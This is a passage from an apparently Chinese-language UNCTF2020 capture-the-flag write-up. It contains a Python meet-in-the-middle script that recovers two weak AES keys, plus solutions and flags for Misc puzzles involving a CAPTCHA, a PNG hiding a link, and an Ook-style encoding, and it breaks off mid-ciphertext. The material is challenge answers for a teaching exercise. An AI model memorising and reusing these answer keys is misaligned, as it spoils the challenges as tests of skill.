<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">pt = <span class="string">"UNCTF2020_Enjoy_Crypto~"</span>.encode()</span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">b'\x00'</span>*(<span class="number">16</span> - val)</span><br><span class="line">target = unhexlify(<span class="string">b"01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd"</span>)</span><br><span class="line">lookup_table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># create all 100^3 forward-encryption-options</span></span><br><span class="line"><span class="keyword">for</span> p1 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">""</span>.join(p1)</span><br><span class="line">    key1 = <span class="string">"0000000000000"</span> + key</span><br><span class="line"></span><br><span class="line">    cipher1 = AES.new(key=key1.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    c1 = cipher1.encrypt(pt)</span><br><span class="line">    lookup_table[c1] = key1</span><br><span class="line"></span><br><span class="line">print(<span class="string">"done creating lookup table"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create all 100^3 backward-encryption-options</span></span><br><span class="line"><span class="keyword">for</span> p2 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">""</span>.join(p2)</span><br><span class="line">    key2 = key + <span class="string">"0000000000000"</span></span><br><span class="line"></span><br><span class="line">    cipher2 = AES.new(key=key2.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    c2 = cipher2.decrypt(target)</span><br><span class="line">    <span class="keyword">if</span> c2 <span class="keyword">in</span> lookup_table:  <span class="comment"># check if the decryption of target == encryption of known plaintext</span></span><br><span class="line">        key1 = lookup_table[c2]</span><br><span class="line">        print(<span class="string">"key1:"</span>, key1, <span class="string">"key2:"</span>, key2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part 2: decryption</span></span><br><span class="line"></span><br><span class="line">flag = unhexlify(<span class="string">b"196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> [key2, key1]:</span><br><span class="line">    cipher = AES.new(key=key.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(flag)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{524e314a-5843-3030-5939-333230323541}</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h4><p>这题真是硬看的，连续输入十次正确的验证码即可得到flag。</p>
<h4 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h4><p>题目描述：</p>
<blockquote>
<p>了解一下png图片格式</p>
</blockquote>
<p>下载附件得到一张图片，直接使用十六进制编辑器打开，在最下面发现存在一个b站链接，复制下来访问它</p>
<p>在视频下方评论处拿到flag。</p>
<p>flag：unctf{let’s_study_pwn}</p>
<h4 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h4><p>下载附件，是一个txt文本，里面全是形如 “就这. 就这¿ 不会吧! “ 的字符串，这题也是尝试好几种情况，摩斯密码还有网上找到类似的阴阳人编码，都解密无果，后来想到我们需要解密的就是这些字符串后面所跟的符号，于是使用Ook解密，对应替换为Ook编码形式，密文变成：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span 